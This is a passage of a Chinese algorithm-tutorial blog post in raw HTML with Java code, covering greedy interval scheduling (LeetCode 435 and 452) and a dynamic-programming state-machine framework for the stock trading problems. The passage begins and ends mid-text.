至少有一个不在 lcs 中，删一个</span><br>        memo[i][j] = Math.min(<br>            s1.charAt(i) + dp(s1, i + <span class="hljs-number">1</span>, s2, j),<br>            s2.charAt(j) + dp(s1, i, s2, j + <span class="hljs-number">1</span>)<br>        );<br>    &#125;<br>    <span class="hljs-keyword">return</span> memo[i][j];<br>&#125;<br></code></pre></td></tr></table></figure><p>base case 有一定区别，计算lcs长度时，如果一个字符串为空，那么lcs长度必然是 0；但是这道题如果一个字符串为空，另一个字符串必然要被全部删除，所以需要计算另一个字符串所有字符的 ASCII 码之和。</p><p>关于状态转移，当s1[i]和s2[j]相同时不需要删除，不同时需要删除，所以可以利用dp函数计算两种情况，得出最优的结果。其他的大同小异，就不具体展开了。</p><p>至此，三道子序列问题就解决完了，关键在于将问题细化到字符，根据每两个字符是否相同来判断他们是否在结果子序列中，从而避免了对所有子序列进行穷举。</p><h1 id="7-贪心类型问题"><a href="#7-贪心类型问题" class="headerlink" title="7. 贪心类型问题"></a>7. 贪心类型问题</h1><p>什么是贪心算法呢？贪心算法可以认为是动态规划算法的一个特例，相比动态规划，使用贪心算法需要满足更多的条件（贪心选择性质），但是效率比动态规划要高。</p><p>比如说一个算法问题使用暴力解法需要指数级时间，如果能使用动态规划消除重叠子问题，就可以降到多项式级别的时间，如果满足贪心选择性质，那么可以进一步降低时间复杂度，达到线性级别的。</p><p>什么是贪心选择性质呢，简单说就是：每一步都做出一个局部最优的选择，最终的结果就是全局最优。注意哦，这是一种特殊性质，其实只有一部分问题拥有这个性质。</p><p>比如你面前放着 100 张人民币，你只能拿十张，怎么才能拿最多的面额？显然每次选择剩下钞票中面值最大的一张，最后你的选择一定是最优的。</p><p>然而，大部分问题明显不具有贪心选择性质。比如打斗地主，对手出对儿三，按照贪心策略，你应该出尽可能小的牌刚好压制住对方，但现实情况我们甚至可能会出王炸。这种情况就不能用贪心算法，而得使用动态规划解决，参见前文「动态规划解决博弈问题」。</p><h2 id="7-1-问题概述"><a href="#7-1-问题概述" class="headerlink" title="7.1 问题概述"></a>7.1 问题概述</h2><p>言归正传，本文解决一个很经典的贪心算法问题 Interval Scheduling（区间调度问题）。给你很多形如 <code>[start, end]</code> 的闭区间，请你设计一个算法，<strong>算出这些区间中最多有几个互不相交的区间</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">intervalSchedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] intvs)</span> </span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>举个例子，<code>intvs = [[1,3], [2,4], [3,6]]</code>，这些区间最多有 2 个区间互不相交，即 <code>[[1,3], [3,6]]</code>，你的算法应该返回 2。注意边界相同并不算相交。</p><p>这个问题在生活中的应用广泛，比如你今天有好几个活动，每个活动都可以用区间 <code>[start, end]</code> 表示开始和结束的时间，请问你今天<strong>最多能参加几个活动呢？</strong>显然你一个人不能同时参加两个活动，所以说这个问题就是求这些时间区间的最大不相交子集。</p><h2 id="7-2-贪心解法"><a href="#7-2-贪心解法" class="headerlink" title="7.2 贪心解法"></a>7.2 贪心解法</h2><p>这个问题有许多看起来不错的贪心思路，却都不能得到正确答案。比如说：</p><p>也许我们可以每次选择可选区间中开始最早的那个？但是可能存在某些区间开始很早，但是很长，使得我们错误地错过了一些短的区间。或者我们每次选择可选区间中最短的那个？或者选择出现冲突最少的那个区间？这些方案都能很容易举出反例，不是正确的方案。</p><p>正确的思路其实很简单，可以分为以下三步：</p><ol><li>从区间集合 intvs 中选择一个区间 x，这个 x 是在当前所有区间中<strong>结束最早的</strong>（end 最小）。</li><li>把所有与 x 区间相交的区间从区间集合 intvs 中删除。</li><li>重复步骤 1 和 2，直到 intvs 为空为止。之前选出的那些 x 就是最大不相交子集。</li></ol><p><strong>最优子结构就是与上一个区间没有相交且最短的区间</strong></p><p>把这个思路实现成算法的话，可以按每个区间的 <code>end</code> 数值升序排序，因为这样处理之后实现步骤 1 和步骤 2 都方便很多:</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/贪心解法.gif" alt="img" style="zoom:50%;" /></p><p>现在来实现算法，对于步骤 1，由于我们预先按照 <code>end</code> 排了序，所以选择 x 是很容易的。关键在于，如何去除与 x 相交的区间，选择下一轮循环的 x 呢？</p><p><strong>由于我们事先排了序</strong>，不难发现所有与 x 相交的区间必然会与 x 的 <code>end</code> 相交；如果一个区间不想与 x 的 <code>end</code> 相交，它的 <code>start</code> 必须要大于（或等于）x 的 <code>end</code>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/贪心问题2" alt="img" style="zoom:50%;" /></p><p>看下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">intervalSchedule</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] intvs)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (intvs.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 按 end 升序排序</span><br>    Arrays.sort(intvs, <span class="hljs-keyword">new</span> Comparator&lt;<span class="hljs-keyword">int</span>[]&gt;() &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] a, <span class="hljs-keyword">int</span>[] b)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] - b[<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;);<br>    <span class="hljs-comment">// 至少有一个区间不相交</span><br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 排序后，第一个区间就是 x</span><br>    <span class="hljs-keyword">int</span> x_end = intvs[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] interval : intvs) &#123;<br>        <span class="hljs-keyword">int</span> start = interval[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (start &gt;= x_end) &#123;<br>            <span class="hljs-comment">// 找到下一个选择的区间了</span><br>            count++;<br>            x_end = interval[<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-3-应用举例"><a href="#7-3-应用举例" class="headerlink" title="7.3 应用举例"></a>7.3 应用举例</h2><p>下面举例几道 LeetCode 题目应用一下区间调度算法。</p><p>第 435 题，无重叠区间：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/无重叠区间.png" alt="img" style="zoom: 67%;" /></p><p>我们已经会求最多有几个区间不会重叠了，那么剩下的不就是至少需要去除的区间吗？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">eraseOverlapIntervals</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] intervals)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = intervals.length;<br>    <span class="hljs-keyword">return</span> n - intervalSchedule(intervals);<br>&#125;<br></code></pre></td></tr></table></figure><p>第 452 题，用最少的箭头射爆气球：</p><p><img src="F:\QQPCmgr\Desktop\用最少的箭头射爆气球.jpg" alt="img" style="zoom: 67%;" /></p><p>其实稍微思考一下，这个问题和区间调度算法一模一样！如果最多有 <code>n</code> 个不重叠的区间，那么就至少需要 <code>n</code> 个箭头穿透所有区间：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/贪心3.jpg" alt="img" style="zoom:50%;" /></p><p>只是有一点不一样，在 <code>intervalSchedule</code> 算法中，如果两个区间的边界触碰，不算重叠；而按照这道题目的描述，箭头如果碰到气球的边界气球也会爆炸，所以说相当于区间的边界触碰也算重叠：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/贪心4.jpg" alt="img" style="zoom:50%;" /></p><p>所以只要将之前的算法稍作修改，就是这道题目的答案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">findMinArrowShots</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] intvs)</span> </span>&#123;<br>    <span class="hljs-comment">// ...</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] interval : intvs) &#123;<br>        <span class="hljs-keyword">int</span> start = interval[<span class="hljs-number">0</span>];<br>        <span class="hljs-comment">// 把 &gt;= 改成 &gt; 就行了</span><br>        <span class="hljs-keyword">if</span> (start &gt; x_end) &#123;<br>            count++;<br>            x_end = interval[<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="8-其他"><a href="#8-其他" class="headerlink" title="8. 其他"></a>8. 其他</h1><h2 id="8-1-股票买卖问题"><a href="#8-1-股票买卖问题" class="headerlink" title="8.1 股票买卖问题"></a>8.1 股票买卖问题</h2><p>先随便抽出一道题，看看别人的解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(prices.empty()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> s1=-prices[<span class="hljs-number">0</span>],s2=INT_MIN,s3=INT_MIN,s4=INT_MIN;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;prices.size();++i) &#123;            <br>        s1 = max(s1, -prices[i]);<br>        s2 = max(s2, s1+prices[i]);<br>        s3 = max(s3, s2-prices[i]);<br>        s4 = max(s4, s3+prices[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(<span class="hljs-number">0</span>,s4);<br>&#125;<br></code></pre></td></tr></table></figure><p>能看懂吧？会做了吗？不可能的，你看不懂，这才正常。就算你勉强看懂了，下一个问题你还是做不出来。为什么别人能写出这么诡异却又高效的解法呢？因为这类问题是有框架的，但是人家不会告诉你的，因为一旦告诉你，你五分钟就学会了，该算法题就不再神秘，变得不堪一击了。</p><p>本文就来告诉你这个框架，然后带着你一道一道秒杀。这篇文章用状态机的技巧来解决，可以全部提交通过。不要觉得这个名词高大上，文学词汇而已，实际上就是 DP table，看一眼就明白了。</p><p>这 6 道题目是有共性的，我就抽出来第 4 道题目，因为这道题是一个最泛化的形式，其他的问题都是这个形式的简化，看下题目：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/股票1.png" alt="img" style="zoom: 67%;" /></p><p>第一题是只进行一次交易，相当于 k = 1；第二题是不限交易次数，相当于 k = +infinity（正无穷）；第三题是只进行 2 次交易，相当于 k = 2；剩下两道也是不限次数，但是加了交易「冷冻期」和「手续费」的额外条件，其实就是第二题的变种，都很容易处理。</p><p>如果你还不熟悉题目，可以去 LeetCode 查看这些题目的内容，本文为了节省篇幅，就不列举这些题目的具体内容了。下面言归正传，开始解题。</p><p><strong>一、穷举框架</strong></p><p>首先，还是一样的思路：如何穷举？这里的穷举思路和上篇文章递归的思想不太一样。</p><p>递归其实是符合我们思考的逻辑的，一步步推进，遇到无法解决的就丢给递归，一不小心就做出来了，可读性还很好。缺点就是一旦出错，你也不容易找到错误出现的原因。比如上篇文章的递归解法，肯定还有计算冗余，但确实不容易找到。</p><p>而这里，我们不用递归思想进行穷举，而是利用「状态」进行穷举。我们具体到每一天，看看总共有几种可能的「状态」，再找出每个「状态」对应的「选择」。我们要穷举所有「状态」，穷举的目的是根据对应的「选择」更新状态。听起来抽象，你只要记住「状态」和「选择」两个词就行，下面实操一下就很容易明白了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> 状态<span class="hljs-number">1</span> in 状态<span class="hljs-number">1</span>的所有取值：<br>    <span class="hljs-keyword">for</span> 状态<span class="hljs-number">2</span> in 状态<span class="hljs-number">2</span>的所有取值：<br>        <span class="hljs-keyword">for</span> ...<br>            dp[状态<span class="hljs-number">1</span>][状态<span class="hljs-number">2</span>][...] = 择优(选择<span class="hljs-number">1</span>，选择<span class="hljs-number">2.</span>..)<br></code></pre></td></tr></table></figure><p>比如说这个问题，<strong>每天都有三种「选择」</strong>：买入、卖出、无操作，我们用 buy, sell, rest 表示这三种选择。但问题是，并不是每天都可以任意选择这三种选择的，因为 sell 必须在 buy 之后，buy 必须在 sell 之后。那么 rest 操作还应该分两种状态，一种是 buy 之后的 rest（持有了股票），一种是 sell 之后的 rest（没有持有股票）。而且别忘了，我们还有交易次数 k 的限制，就是说你 buy 还只能在 k &gt; 0 的前提下操作。</p><p>很复杂对吧，不要怕，我们现在的目的只是穷举，你有再多的状态，老夫要做的就是一把梭全部列举出来。<strong>这个问题的「状态」有三个</strong>，第一个是天数，第二个是允许交易的最大次数，第三个是当前的持有状态（即之前说的 rest 的状态，我们不妨用 1 表示持有，0 表示没有持有）。然后我们用一个三维数组就可以装下这几种状态的全部组合：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">dp[i][k][<span class="hljs-number">0</span> or <span class="hljs-number">1</span>]<br><span class="hljs-number">0</span> &lt;= i &lt;= n-<span class="hljs-number">1</span>, <span class="hljs-number">1</span> &lt;= k &lt;= K<br>n 为天数，大 K 为最多交易数<br>此问题共 n × K × <span class="hljs-number">2</span> 种状态，全部穷举就能搞定。<br><br><span class="hljs-keyword">for</span> <span class="hljs-number">0</span> &lt;= i &lt; n:<br>    <span class="hljs-keyword">for</span> <span class="hljs-number">1</span> &lt;= k &lt;= K:<br>        <span class="hljs-keyword">for</span> s in &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;:<br>            dp[i][k][s] = max(buy, sell, rest)<br></code></pre></td></tr></table></figure><p>而且我们可以用自然语言描述出每一个状态的含义，比如说 <code>dp[3][2][1]</code> 的含义就是：今天是第三天，我现在手上持有着股票，至今最多进行 2 次交易。再比如 <code>dp[2][3][0]</code> 的含义：今天是第二天，我现在手上没有持有股票，至今最多进行 3 次交易。很容易理解，对吧？</p><p>我们想求的最终答案是 $dp[n - 1][K][0]$，即最后一天，最多允许 K 次交易，最多获得多少利润。读者可能问为什么不是 $dp[n - 1][K][1]$？因为 [1] 代表手上还持有股票，[0] 表示手上的股票已经卖出去了，很显然后者得到的利润一定大于前者。</p><p>记住如何解释「状态」，一旦你觉得哪里不好理解，把它翻译成自然语言就容易理解了。</p><p><strong>二、状态转移框架</strong></p><p>现在，我们完成了「状态」的穷举，我们开始思考每种「状态」有哪些「选择」，应该如何更新「状态」。只看「持有状态」，可以画个状态转移图。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/股票2.png" alt="img" style="zoom: 67%;" /></p><p>通过这个图可以很清楚地看到，每种状态（0 和 1）是如何转移而来的。根据这个图，我们来写一下状态转移方程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">dp[i][k][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i])<br>              max(   选择 rest  ,             选择 sell      )<br><br>解释：今天我没有持有股票，有两种可能：<br>要么是我昨天就没有持有，然后今天选择 rest，所以我今天还是没有持有；<br>要么是我昨天持有股票，但是今天我 sell 了，所以我今天没有持有股票了。<br><br>dp[i][k][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i])<br>              max(   选择 rest  ,           选择 buy         )<br><br>解释：今天我持有着股票，有两种可能：<br>要么我昨天就持有着股票，然后今天选择 rest，所以我今天还持有着股票；<br>要么我昨天本没有持有，但今天我选择 buy，所以今天我就持有股票了。<br></code></pre></td></tr></table></figure><p>这个解释应该很清楚了，如果 buy，就要从利润中减去 prices[i]，如果 sell，就要给利润增加 prices[i]。今天的最大利润就是这两种可能选择中较大的那个。而且注意 k 的限制，我们在选择 buy 的时候，把 k 减小了 1，很好理解吧，当然你也可以在 sell 的时候减 1，一样的。</p><p>现在，我们已经完成了动态规划中最困难的一步：状态转移方程。<strong>如果之前的内容你都可以理解，那么你已经可以秒杀所有问题了，只要套这个框架就行了。</strong>不过还差最后一点点，就是定义 base case，即最简单的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">dp[-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>解释：因为 i 是从 <span class="hljs-number">0</span> 开始的，所以 i = -<span class="hljs-number">1</span> 意味着还没有开始，这时候的利润当然是 <span class="hljs-number">0</span> 。<br>dp[-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] = -infinity<br>解释：还没开始的时候，是不可能持有股票的，用负无穷表示这种不可能。<br>dp[i][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>解释：因为 k 是从 <span class="hljs-number">1</span> 开始的，所以 k = <span class="hljs-number">0</span> 意味着根本不允许交易，这时候利润当然是 <span class="hljs-number">0</span> 。<br>dp[i][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = -infinity<br>解释：不允许交易的情况下，是不可能持有股票的，用负无穷表示这种不可能。<br></code></pre></td></tr></table></figure><p>把上面的状态转移方程总结一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">base <span class="hljs-keyword">case</span>：<br>dp[-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>] = dp[i][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>dp[-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] = dp[i][<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = -infinity<br><br>状态转移方程：<br>dp[i][k][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i])<br>dp[i][k][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i])<br></code></pre></td></tr></table></figure><p>读者可能会问，这个数组索引是 -1 怎么编程表示出来呢，负无穷怎么表示呢？这都是细节问题，有很多方法实现。现在完整的框架已经完成，下面开始具体化。</p><p><strong>三、秒杀题目</strong></p><p><strong>第一题，k = 1</strong></p><p>直接套状态转移方程，根据 base case，可以做一些化简：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs inform7">dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[1]</span><span class="hljs-comment">[0]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span><span class="hljs-comment">[0]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span><span class="hljs-comment">[1]</span> + prices<span class="hljs-comment">[i]</span>)<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[1]</span><span class="hljs-comment">[1]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span><span class="hljs-comment">[1]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span> - prices<span class="hljs-comment">[i]</span>) <br>            = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span><span class="hljs-comment">[1]</span>, -prices<span class="hljs-comment">[i]</span>)<br>解释：k = 0 的 base case，所以 dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span> = 0。<br><br>现在发现 k 都是 1，不会改变，即 k 对状态转移已经没有影响了。<br>可以进行进一步化简去掉所有 k：<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[0]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[0]</span>, dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span> + prices<span class="hljs-comment">[i]</span>)<br>dp<span class="hljs-comment">[i]</span><span class="hljs-comment">[1]</span> = max(dp<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[1]</span>, -prices<span class="hljs-comment">[i]</span>)<br></code></pre></td></tr></table></figure><p>直接写出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> n = prices.length;<br><span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    dp[i][<span class="hljs-number">0</span>] = Math.max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] + prices[i]);<br>    dp[i][<span class="hljs-number">1</span>] = Math.max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], -prices[i]);<br>&#125;<br><span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>显然 i = 0 时 dp[i-1] 是不合法的。这是因为我们没有对 i 的 base case 进行处理。可以这样处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">if</span> (i - <span class="hljs-number">1</span> == -<span class="hljs-number">1</span>) &#123;<br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 解释：</span><br>        <span class="hljs-comment">//   dp[i][0] </span><br>        <span class="hljs-comment">// = max(dp[-1][0], dp[-1][1] + prices[i])</span><br>        <span class="hljs-comment">// = max(0, -infinity + prices[i]) = 0</span><br>        dp[i][<span class="hljs-number">1</span>] = -prices[i];<br>        <span class="hljs-comment">//解释：</span><br>        <span class="hljs-comment">//   dp[i][1] </span><br>        <span class="hljs-comment">// = max(dp[-1][1], dp[-1][0] - prices[i])</span><br>        <span class="hljs-comment">// = max(-infinity, 0 - prices[i]) </span><br>        <span class="hljs-comment">// = -prices[i]</span><br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dp[i][<span class="hljs-number">0</span>] = Math.max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] + prices[i]);<br>    dp[i][<span class="hljs-number">1</span>] = Math.max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], -prices[i]);<br>&#125;<br><span class="hljs-keyword">return</span> dp[n - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><p>第一题就解决了，但是这样处理 base case 很麻烦，而且注意一下状态转移方程，新状态只和相邻的一个状态有关，其实不用整个 dp 数组，只需要一个变量储存相邻的那个状态就足够了，这样可以把空间复杂度降到 O(1):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// k == 1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit_k_1</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = prices.length;<br>    <span class="hljs-comment">// base case: dp[-1][0] = 0, dp[-1][1] = -infinity</span><br>    <span class="hljs-keyword">int</span> dp_i_0 = <span class="hljs-number">0</span>, dp_i_1 = Integer.MIN_VALUE;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-comment">// dp[i][0] = max(dp[i-1][0], dp[i-1][1] + prices[i])</span><br>        dp_i_0 = Math.max(dp_i_0, dp_i_1 + prices[i]);<br>        <span class="hljs-comment">// dp[i][1] = max(dp[i-1][1], -prices[i])</span><br>        dp_i_1 = Math.max(dp_i_1, -prices[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp_i_0;<br>&#125;<br></code></pre></td></tr></table></figure><p>两种方式都是一样的，不过这种编程方法简洁很多。但是如果没有前面状态转移方程的引导，是肯定看不懂的。后续的题目，我主要写这种空间复杂度 O(1) 的解法。</p><p><strong>第二题，k = +infinity</strong></p><p>如果 k 为正无穷，那么就可以认为 k 和 k - 1 是一样的。可以这样改写框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">dp[i][k][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>] + prices[i])<br>dp[i][k][<span class="hljs-number">1</span>] = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - prices[i])<br>            = max(dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">1</span>], dp[i-<span class="hljs-number">1</span>][k][<span class="hljs-number">0</span>] - prices[i])<br><br>我们发现数组中的 k 已经不会改变了，也就是说不需要记录 k 这个状态了：<br>dp[i][<span class="hljs-number">0</span>] = max(dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>], dp[i-<span class="hljs-number">1</span>][<span 